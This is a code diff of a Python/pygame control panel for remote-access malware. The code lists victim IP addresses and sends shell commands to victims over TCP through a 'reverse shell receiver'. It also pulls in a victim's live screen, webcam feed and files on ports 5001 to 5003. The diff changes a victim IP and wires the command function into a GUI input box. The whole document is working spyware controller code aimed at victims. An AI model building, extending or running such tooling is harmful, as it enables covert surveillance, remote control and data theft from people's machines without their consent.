@@ -73,7 +73,7 @@ class Button:
 
 import textwrap
 class InputBox:
-    def __init__(self, x, y, width, height):
+    def __init__(self, x, y, width, height,host):
         self.rect = pygame.Rect(x, y, width, height)
         self.color = BLACK
         self.text = ''
@@ -84,6 +84,7 @@ class InputBox:
         self.scroll_offset = 0  # Vị trí cuộn hiện tại
         self.cursor_visible = True  # Con trỏ chuột
         self.cursor_counter = 0  # Để điều khiển nhấp nháy con trỏ
+        self.host = host
 
     def handle_event(self, event):
         if event.type == pygame.MOUSEBUTTONDOWN:
@@ -96,7 +97,7 @@ class InputBox:
         if event.type == pygame.KEYDOWN and self.active:
             if event.key == pygame.K_RETURN:
                 command = self.text.strip()
-                result = self.send_command(command)
+                result = R_tcp(self.host,command)
                 self.history.append(f"$ {command}")
                 self.history.append(result)
                 self.text = ''
@@ -153,26 +154,10 @@ class InputBox:
         if self.cursor_counter % 60 < 30:
             self.cursor_visible = True
         else:
-            self.cursor_visible = False
-
-    def send_command(self, command):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            BUFFER_SIZE = 1024
-            s.connect((displays.text, options.port))
-            
-            s.send(command.encode())
-            if command.lower() == "exit":
-                return "Disconnected."
-
-            results = s.recv(BUFFER_SIZE).decode()
-            s.close()
-            return results.strip()
-        except Exception as e:
-            return f"Error when sending command: {e}"
+            self.cursor_visible = False        
 
 # vector victim origin
-VICTIM_IPS = ['10.10.27.191','10.10.27.239', '10.0.2.15']
+VICTIM_IPS = ['10.10.27.191','192.168.1.6', '10.0.2.15']
 
 # check victim status 
 def check_victim_status(hosts, port):
@@ -188,23 +173,6 @@ def check_victim_status(hosts, port):
             victims_status[host] = "Not reachable"
     return victims_status
 
-def choose_victim(victims_status):
-    print("Victim Status:")
-    for i, (host, status) in enumerate(victims_status.items(), 1):
-        print(f"{i}. {host} - {status}")
-    
-    while True:
-        choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
-        if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
-            selected_host = list(victims_status.keys())[int(choice) - 1]
-            # Kiểm tra trạng thái là "Reachable"
-            if victims_status[selected_host] == "Reachable":
-                return selected_host
-            else:
-                print(f"Victim {selected_host} is not reachable.")
-        else:
-            print("Invalid choice, try again.")
-
 # Create initial displays
 displays = [
     Display(50, 50, 200, 150, VICTIM_IPS[0]),
@@ -219,9 +187,10 @@ back_button = Display(10, 10, 100, 50, "Back")
 # Camera, Screen, and File thread status
 camera_running = False
 screen_running = False
+file_sending = False
 
 # Define the video panel rectangle for screen stream
-screen_panel_rect = pygame.Rect(50, 50, 500, 500)  # X, Y, Width, Height
+screen_panel_rect = pygame.Rect(100, 70, 600, 300)  # X, Y, Width, Height
 
 def create_new_display():
     num_displays = len(displays)
@@ -232,29 +201,20 @@ def create_new_display():
     return Display(x, y, 200, 150, f"Display {num_displays + 1}")
 
 # reverse shell receiver
-def R_tcp(selected_host = "192.168.1.3", port=5000):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    BUFFER_SIZE = 4096
-    s.connect((selected_host, port))
-    print(f"Connected to victim at {selected_host}:{port}")
-    
-    while True:
-        command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
+def R_tcp(host, command):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        BUFFER_SIZE = 4096
+        s.connect((host, options.port))
         s.send(command.encode())
-        
         if command.lower() == "exit":
-            print("Exiting reverse shell...")
-            break
-        
+            return "Disconnected."
         results = s.recv(BUFFER_SIZE).decode()
-        
-        if not results:
-            print("No output received.")
-        else:
-            print(results)
+        s.close()
+        return results.strip()
+    except Exception as e:
+        return f"Error when sending command: {e}"
     
-    s.close()
-
 def recvall(sock, length, buffer_size=8192):
     buf = b''
     while len(buf) < length:
@@ -295,7 +255,7 @@ def screenreceiver(host, port=5001):
 
                 print(f"Decompressed frame size: {len(pixels)} bytes")
 
-                img = pygame.image.fromstring(pixels, (500, 500), 'RGB')
+                img = pygame.image.fromstring(pixels, (600, 300), 'RGB')
                 screen.blit(img, screen_panel_rect.topleft)
                 pygame.display.flip() 
                 pygame.display.update([screen_panel_rect])
@@ -329,6 +289,8 @@ def camreceiver(host, port=5002):
     cv2.destroyAllWindows()
 
 def receive_file(host, port, save_directory='received_files'):
+    global file_sending
+    file_sending = True
     if not os.path.exists(save_directory):
         os.makedirs(save_directory)
 
@@ -344,6 +306,7 @@ def receive_file(host, port, save_directory='received_files'):
                     file_info = conn.recv(1024).strip().decode('utf-8')
                     if not file_info:
                         print("No more file info received.")
+                        file_sending = False
                         break
 
                     filename, filesize = file_info.split('|')
@@ -370,15 +333,16 @@ def show_full_screen(display):
     pygame.init()
     font = pygame.font.SysFont(None, 36)
     full_screen = True
-    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130)
+    input_box = InputBox(WIDTH // 4 - 100, HEIGHT // 2 + 160, 590, 130, display.text)
     camera_button = Button(WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Camera", GREEN)
     screen_button = Button(3 * WIDTH // 4 - 100, HEIGHT // 2 + 100, 190, 50, "Start Screen", BLUE)
     file_button = Button(WIDTH // 2 - 100, HEIGHT // 2 + 100, 190, 50, "Receive File", RED)
         
     camera_thread = None
     screen_thread = None
+    file_thread = None
 
-    global camera_running, screen_running
+    global camera_running, screen_running, file_sending
 
     while full_screen:
         for event in pygame.event.get():
@@ -393,23 +357,30 @@ def show_full_screen(display):
                         full_screen = False
                     elif camera_button.rect.collidepoint(event.pos):
                         if not camera_running:
-                            camera_thread = threading.Thread(target=camreceiver(host=display.text))
-                            camera_thread.start()
                             camera_button.text = "Stop Camera"
+                            camera_thread = threading.Thread(target=camreceiver(display.text,))
+                            camera_thread.start()
                         else:
                             camera_running = False
                             camera_button.text = "Start Camera"
                     elif screen_button.rect.collidepoint(event.pos):
                         if not screen_running:
-                            screen_thread = threading.Thread(target=screenreceiver(host=display.text))
-                            screen_thread.start()
                             screen_button.text = "Stop Screen"
+                            screen_thread = threading.Thread(target=screenreceiver(display.text,))
+                            screen_thread.start()
                         else:
                             screen_running = False
                             screen_button.text = "Start Screen"
-                    elif file_button.rect.collidepoint(event.pos):               
-                        file_thread = threading.Thread(target=receive_file, args=("0.0.0.0", options.port + 3))  # Port 5003
-                        file_thread.start()
+                    elif file_button.rect.collidepoint(event.pos):   
+                        file_button.text = "Sending..."           
+                        if not file_sending:
+                            file_thread = threading.Thread(target=receive_file, args=("0.0.0.0", options.port + 3)) 
+                            file_thread.start()  
+                        else:
+                            file_sending = False
+
+        if not file_sending and file_button.text == "Sending...":
+            file_button.text = "Receive File"
 
         screen.fill(WHITE)
         input_box.draw(screen)
